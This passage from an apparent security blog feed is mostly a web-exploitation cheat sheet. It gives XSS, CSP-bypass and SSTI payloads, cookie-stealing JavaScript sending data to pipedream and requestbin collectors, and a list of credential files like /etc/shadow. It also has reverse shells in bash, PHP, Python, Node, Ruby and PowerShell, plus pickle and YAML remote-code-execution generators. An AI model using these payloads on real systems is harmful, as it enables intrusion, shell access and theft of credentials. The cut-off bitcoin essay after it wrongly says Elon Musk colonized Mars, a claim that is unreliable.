class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img<span class="symbol">&amp;Tab;</span>src=1<span class="symbol">&amp;Tab;</span>onerror=alert(1)<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Iframe-Sandbox-Bypass"><a href="#Iframe-Sandbox-Bypass" class="headerlink" title=" Iframe Sandbox Bypass"></a><span style="color:#21C587"></span> Iframe Sandbox Bypass<br></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>iframe sandbox bypass<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> cmd=<span class="string">&quot;xss payoad&quot;</span></span></span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener((<span class="string">&#x27;load&#x27;</span>), r); &#125;);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.querySelector(<span class="string">&#x27;iframe&#x27;</span>)</span></span><br><span class="line">              .contentWindow</span><br><span class="line"><span class="javascript">              .postMessage(cmd, <span class="string">&#x27;*&#x27;</span>);  <span class="comment">// IDE -&gt; sandbox message</span></span></span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&quot;exploit()&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&#x27;pocas&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;https://domain/sandbox.html&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass<br></h2><p><span style="color:#21C587">&#35;</span> Use an accepted domain<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39; http:&#x2F;&#x2F;141.164.52.207</span><br></pre></td></tr></table></figure><p>ìœ„ì™€ ê°™ì´ ë‚˜ ìì‹ ê³¼ íŠ¹ì •(<a href="http://141.164.52.207/">http://141.164.52.207</a>) ë„ë©”ì¸ì—ì„œ ì˜¤ëŠ” ìŠ¤í¬ë¦½íŠ¸ëŠ” ì‹¤í–‰ì´ ê°€ëŠ¥í•œ ê²½ìš°, í•´ë‹¹ ì„œë²„ì— íŒŒì¼(xss poc)ì„ ì—…ë¡œë“œí•˜ê³ , poc ì½”ë“œë¥¼ ë¶ˆëŸ¬ì˜¤ë©´ ìœ„ì™€ ê°™ì€ CSPë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><span style="color:#21C587">&#35;</span> Header Injection<br></p><p>ë§Œì•½ í—¤ë” ì¸ì ì…˜ì´ ê°€ëŠ¥í•˜ë‹¤ê³  ê°€ì •í•˜ì— ì‘ë‹µ ì½”ë“œë¥¼ 102ì™€ ê°™ì€ ê²ƒë“¤ë¡œ ìˆ˜ì •í•˜ë©´ ë¸Œë¼ìš°ì €ëŠ” CSPë¥¼ í•´ì„í•˜ì§€ ì•Šì•„ ìš°íšŒê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p><span style="color:#21C587">&#35;</span> AngularJS xss<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39; script-src &#39;self&#39; cdnjs.cloudflare.com;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([location.replace(&quot;url&quot;+document.cookie)],console.log)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ë§Œì•½ ìœ„ì™€ ê°™ì´ <code>cdnjs.cloudflare.com</code>ì™€ ê°™ì´ AngularJSë¥¼ ê°€ì ¸ì™€ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆì„ ê²½ìš° AngularJS XSSë¥¼ ì´ìš©í•˜ë©´ CSPë¥¼ ìš°íšŒí•  ìˆ˜ ìˆê³ , ì˜ˆì‹œ í˜ì´ë¡œë“œëŠ” ìœ„ì™€ ê°™ìŠµë‹ˆë‹¤.</p><p><span style="color:#21C587">&#35;</span> CSP Option â†” Bypass<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: </span><br><span class="line">default-src &#x27;self&#x27; data: *; connect-src &#x27;self&#x27;; script-src  &#x27;self&#x27; ;</span><br><span class="line">report-uri /_csp; upgrade-insecure-requests</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;&lt;script src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src https://google.com &#x27;unsafe-eval&#x27; data: http://*; </span><br><span class="line">child-src &#x27;none&#x27;; </span><br><span class="line">report-uri /Report-parsing-url;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src https://*.google.com;</span><br><span class="line"></span><br><span class="line">&lt;script+src=&quot;https://accounts.google.com/o/oauth2/revoke?callback=(location.href=&#x27;requestbin/?flag=&#x27;+bdocument.cookie);&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Javascript-Payload"><a href="#Javascript-Payload" class="headerlink" title=" Javascript Payload"></a><span style="color:#21C587"></span> Javascript Payload<br></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;https://pocas.kr&#x27;</span>, &#123;</span><br><span class="line">  method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  headers: &#123;<span class="string">&#x27;headerName&#x27;</span>:<span class="string">&#x27;headerValue&#x27;</span>&#125;</span><br><span class="line">&#125;).then(<span class="function"><span class="params">x</span>=&gt;</span>x.text()).then(<span class="function"><span class="params">x</span>=&gt;</span>fetch(<span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=&quot;</span>+x));</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;https://pocas.kr&#x27;</span>, &#123;</span><br><span class="line">  method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  headers: &#123;<span class="string">&#x27;headerName&#x27;</span>:<span class="string">&#x27;headerValue&#x27;</span>&#125;</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;<span class="keyword">return</span> x.text();&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">xx</span>)</span>&#123;fetch(<span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=&quot;</span>+xx)&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">x.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=&quot;</span> + <span class="built_in">document</span>.cookie, <span class="literal">true</span>);</span><br><span class="line">x.send();</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`fs`</span>).readdirSync(<span class="string">`./`</span>)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`\x63at\x20&lt;FILE&gt;`</span>).toString()</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ì•„ë˜ ì½”ë“œëŠ” íŒŒì¼ì˜ ì´ë¦„ì´ &#x27;T&#x27;ë¡œ ì‹œì‘í•˜ëŠ” íŒŒì¼ì„ ëª¨ë‘ ì½ëŠ” ì½”ë“œì´ë‹¤. ë§Œì•½ ì½ìœ¼ë ¤ëŠ” íŒŒì¼ì˜ ì´ë¦„ì´ &#x27;F&#x27;ë¡œ ì‹œì‘í•œë‹¤ë©´ &#x27;F\x2a&#x27;ë¥¼ ì£¼ë©´ëœë‹¤.</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`\x63at\x20T\x2a`</span>).toString()</span><br></pre></td></tr></table></figure><hr><h2 id="Server-Side-Template-Injection"><a href="#Server-Side-Template-Injection" class="headerlink" title=" Server Side Template Injection"></a><span style="color:#21C587"></span> Server Side Template Injection<br></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br><span class="line">&#123;&#123; [].<span class="keyword">class</span>.base.subclasses() &#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.mro()[<span class="number">1</span>].subclasses()&#125;&#125;</span><br><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__() &#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.mro()[<span class="number">1</span>].__subclasses__()[<span class="number">396</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request|attr(request.args.param)&#125;&#125;&amp;param=__class__</span><br><span class="line">&#123;&#123;request[request.args.param]&#125;&#125;&amp;param=__class__</span><br><span class="line">&#123;&#123;request|attr([request.args.usc*<span class="number">2</span>,request.args.<span class="keyword">class</span>,request.args.usc*<span class="number">2</span>]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([<span class="string">&quot;_&quot;</span>*<span class="number">2</span>,<span class="string">&quot;class&quot;</span>,<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([<span class="string">&quot;__&quot;</span>,<span class="string">&quot;class&quot;</span>,<span class="string">&quot;__&quot;</span>]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;request.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(request.args.f|<span class="built_in">format</span>(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f=%s%sclass%s%s&amp;a=_</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fbase\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;</span>)()&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fbase\x5f\x5fâ€™)|attr(â€˜\x5f\x5fsubclasses\x5f\x5f&#x27;</span>)()|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="number">287</span>)(<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>)|attr(<span class="string">&#x27;communicate&#x27;</span>)()|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="number">0</span>)|attr(<span class="string">&#x27;decode&#x27;</span>)(<span class="string">&#x27;utf-8&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Handlebars Template</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="built_in">JSON</span>.stringify(process.env)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="built_in">JSON</span>.stringify(process.mainModule.constructor._load(<span class="string">&quot;child_process&quot;</span>).exec(<span class="string">&quot;ls&quot;</span>))&#125;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Path-Traversal"><a href="#Path-Traversal" class="headerlink" title=" Path Traversal"></a><span style="color:#21C587"></span> Path Traversal<br></h2><p><span style="color:#21C587">&#35;</span><strong> Ubuntu</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;issue</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;etc&#x2F;group</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;motd</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;exe</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;arp</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;route</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Node</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">package.json</span><br></pre></td></tr></table></figure><hr><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell<br></h2><p><span style="color:#21C587">&#35;</span><strong> Bash</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1</span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1&#39;</span><br><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> PHP</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;domain&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Python</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;kaibro.tw&quot;,5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Node.js</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>), sh = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).exec(<span class="string">&quot;/bin/bash&quot;</span>); <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket(); client.connect(port, <span class="string">&quot;domain&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Ruby</strong><br></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;domain&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Powershell</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c domain -p port -e cmd</span><br></pre></td></tr></table></figure><hr><h2 id="Python-Pickle-RCE-PoC"><a href="#Python-Pickle-RCE-PoC" class="headerlink" title="Python Pickle RCE PoC"></a>Python Pickle RCE PoC<br></h2><p><span style="color:#21C587">&#35;</span><strong> eval</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> __builtins__</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    x = <span class="string">&quot;open(&#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;).read()&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (__builtins__.<span class="built_in">eval</span>, (x,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> os.system</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (os.system, (<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure><hr><h2 id="RCE-with-Ruby-YAML-load"><a href="#RCE-with-Ruby-YAML-load" class="headerlink" title="RCE with Ruby YAML.load"></a>RCE with Ruby YAML.load</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!python&#x2F;object&#x2F;apply:subprocess.check_output [&#39;ls&#39;]</span><br><span class="line">!!python&#x2F;object&#x2F;apply:subprocess.check_output</span><br><span class="line">       args: [ bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1 ]</span><br><span class="line">       kwds: &#123; shell: true &#125;</span><br><span class="line">!!python&#x2F;object&#x2F;apply:os.system [&quot;wget https:&#x2F;&#x2F;requestbin&#x2F;?&#96;cat &#x2F;etc&#x2F;passwd&#96;&quot;]</span><br></pre></td></tr></table></figure><hr><h2 id="IPv4-to-IP-Decimal-Conversion"><a href="#IPv4-to-IP-Decimal-Conversion" class="headerlink" title=" IPv4 to IP Decimal Conversion"></a><span style="color:#21C587"></span> IPv4 to IP Decimal Conversion<br></h2><p><a href="https://www.ipaddressguide.com/ip">Link</a></p><hr><p><em>Reference</em> : <a href="https://www.anquanke.com/post/id/176185">https://www.anquanke.com</a><br><br><em>Reference</em> : <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a><br><br><em>Reference</em> : <a href="https://bittherapy.net/post/a-trick-to-bypass-an-xss-filter-and-execute-javascript/">https://bittherapy.net/post/~/</a><br><br><em>Reference</em> : <a href="https://medium.com/@schopath/bug-bounty-berburu-server-side-request-forgery-ssrf-yuk-2-image-svg-61ecf3ca1951">https://medium.com/@schopath/~</a><br><br><em>Reference</em> : <a href="https://twitter.com/HolyBugx/status/1348928810620743682">https://twitter.com/HolyBugx</a><br><br><em>Reference</em> : <a href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a><br><br><em>Reference</em> : <a href="https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd">https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd</a><br><br><em>Reference</em> : <a href="https://hackerone.com/reports/1024734">https://hackerone.com/reports/1024734</a><br><br><em>Reference</em> : <a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">https://medium.com/@nyomanpradipta120/~</a><br><br><em>Reference</em> : <a href="https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss">https://portswigger.net/research/~</a><br><br><em>Reference</em> : <a href="https://www.ipaddressguide.com/ip">https://www.ipaddressguide.com/ip</a><br><br><em>Reference</em> : <a href="https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets">https://portswigger.net/research</a><br><br><em>Reference</em> : <a href="https://www.bugbountytips.tech/">https://www.bugbountytips.tech/</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CheatSheet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Curse and doubt</title>
      <link href="2021/05/05/2021-05-05-Coin/"/>
      <url>2021/05/05/2021-05-05-Coin/</url>
      
        <content type="html"><![CDATA[<h2 id="My-philosophy"><a href="#My-philosophy" class="headerlink" title="My philosophy"></a>My philosophy</h2><p>Iâ€™m rubberneck at Bitcoin since 2018. At the time, many people suffered tremendous damage through the downtrend. But, thanks to that, many people left. As I learned about Bitcoin in 2018, the big downturn of the year was a new opportunity.</p><p>Why? This is because when i got to know bitcoin, the price was so low that i thought it was a low. But at the time, I was a high school student, so i couldnâ€™t open an account and invest. So I made an account by persuading my parents and asking them to open an account.</p><p>So, I invested all the 300,000 KRW in my pocket money. However, contrary to expectations, as of January 2018, it continued to decline cascades. I needed money on the way, so I sold it at the marcket price and secured cash before it fell further. However, even though it was an error, I saw that the 3800 KRW was not sold and remained as the number of bitcoins 0.xxxxx and left it.</p><p>After watching a big decline for a year, it was one day 2019, From January of this year, I saw a sudden rise in bitcoin. But I doubted again. The reason is that we know that the Buddhist market continued until the end of 2017, followed by a large bearish marcket from the beginning of the following year.</p><p>Nevertheless, I kept loocking at the charts every month. Then one day it was 2021. After a long time, I looged in to the Bithumb exchange and found that the bitcoin yield was 9000%. Maybe it was an opportunity th change my wealth. But it wasnâ€™t fate.</p><p>Like this, I only watched the coins from 2018 to 2021. As a result, many people are  still criticizing and suspicious. Howerver, all coins have increased as of 2018. I thought that this may still be a low poing even when I watched the coin rising like this in February.</p><p>However, I have never studied investment. Because I believe in human indicators rather than value invetment. In other words, I am speculating. But this is alo a simple reason. Because investments is made by humnas. Bots are also locaked by humans targeting specific coins.</p><p>That doesnâ€™t mean that I havenâ€™t studied blockchain. I have been studying about blockchain, and I think it will grow infinitely in the future. Why? Because many people are still suspicious and swearing</p><p>If you think about it, there are famous scientists and entrepreneurs such as Einstein and Elon Musk. When Einstein published his general relativity thesis, few believed. Just everyone doubted and didnâ€™t believe. However, over the past 100 years, general relativity has changed the roots of mankindâ€™s view of the universe. In addition, Elon Musk colonized Mars to create an environment where people can live, and transport people to Mars through rockets. But Elon Musk also had few believers, swearing that he was a scammer, and so too now. However, Elon Musk ran to see only one goal he wanted to achieve, and now he is at the peak of a businessman. Not long ago, the private company, Space X, achieved a tremendous achievement, again setting a new record for recycling rockets. We know that in a few 